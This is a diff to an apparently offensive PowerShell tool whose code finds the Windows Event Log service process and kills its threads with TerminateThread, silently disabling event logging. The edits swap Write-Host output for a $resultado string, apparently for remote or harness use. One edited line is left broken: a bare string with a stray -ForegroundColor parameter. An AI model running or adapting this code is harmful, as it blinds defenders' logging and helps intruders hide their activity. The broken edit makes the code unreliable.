@@ -64,11 +64,10 @@ Author : Halil DALABASMAZ (https://github.com/hlldz, https://twitter.com/hlldz)
 
 '@
 
-    Write-Host $intro -ForegroundColor Cyan
-
-    Write-Host ""
-    Write-Host "[!] I'm here to blur the line between life and death..." -ForegroundColor Cyan
-    Write-Host ""
+    
+    $resultado = $intro
+    $resultado += "`n[!] I'm here to blur the line between life and death..." 
+    
 
     $ScriptBlock = {
         Param (
@@ -1012,7 +1011,7 @@ Author : Halil DALABASMAZ (https://github.com/hlldz, https://twitter.com/hlldz)
         }
 
 
-        Write-Host "[*] Enumerating threads of PID: $(Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId)..." -ForegroundColor Yellow
+        $resultado += "[*] Enumerating threads of PID: $(Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId)..." 
         foreach ($Process in (Get-Process -Id (Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId)))
             {
                 if (($ProcessHandle = $Kernel32::OpenProcess(0x1F0FFF, $false, $Process.Id)) -eq 0) {
@@ -1039,25 +1038,24 @@ Author : Halil DALABASMAZ (https://github.com/hlldz, https://twitter.com/hlldz)
     else { $ReturnedObjects = Invoke-Command -ScriptBlock $ScriptBlock -ArgumentList @($Name, $Id) }
 
     $eventLogThreads = $ReturnedObjects | Where-Object {$_.MappedFile -like '*evt*'} | %{$_.ThreadId }
-    Write-Host "[*] Parsing Event Log Service Threads..." -ForegroundColor Yellow
-
+    $resultado += "[*] Parsing Event Log Service Threads..." 
     if(!($eventLogThreads)) {
-      Write-Host "[!] There are no Event Log Service Threads, Event Log Service is not working!" -ForegroundColor Red
-      Write-Host "[+] You are ready to go!" -ForegroundColor Green
-      Write-Host ""
+       "[!] There are no Event Log Service Threads, Event Log Service is not working!" -ForegroundColor Red
+      $resultado += "[+] You are ready to go! `n"
+      
     }
     else {
         [array]$array = $eventLogThreads
 
         for ($i = 0; $i -lt $array.Count; $i++) {
             $getThread = $Kernel32::OpenThread(0x0001, $false, $($array[$i]))
-            if ($kill = $Kernel32::TerminateThread($getThread, 1)) {Write-Host "[+] Thread $($array[$i]) Succesfully Killed!" -ForegroundColor Green}
+            if ($kill = $Kernel32::TerminateThread($getThread, 1)) {$resultado += "[+] Thread $($array[$i]) Succesfully Killed!"}
             $close = $Kernel32::CloseHandle($getThread)
         }
 
-        Write-Host ""
-        Write-Host "[+] All done, you are ready to go!" -ForegroundColor Green
-        Write-Host ""
+        
+        $resultado += "`n[+] All done, you are ready to go!" 
+        
     }
 
 
